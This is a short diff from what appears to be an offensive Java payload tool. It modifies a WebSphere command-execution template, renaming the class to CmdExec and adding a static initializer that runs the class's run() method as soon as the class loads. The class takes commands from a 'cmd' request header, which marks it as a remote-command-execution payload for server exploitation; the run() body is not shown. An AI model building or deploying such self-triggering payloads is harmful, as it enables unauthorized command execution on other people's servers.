@@ -3,13 +3,20 @@ package com.h2tg.ysogate.template.websphere;
 import java.io.InputStream;
 import java.util.Scanner;
 
-public class WebSphereCmdExecTpl {
+public class CmdExec
+{
 
     private  String getReqHeaderName() {
         return "cmd";
     }
 
-    public WebSphereCmdExecTpl() {
+    static {
+        try {
+            new CmdExec();
+        } catch (Exception e) {
+        }
+    }
+    public CmdExec() {
         run();
     }
 
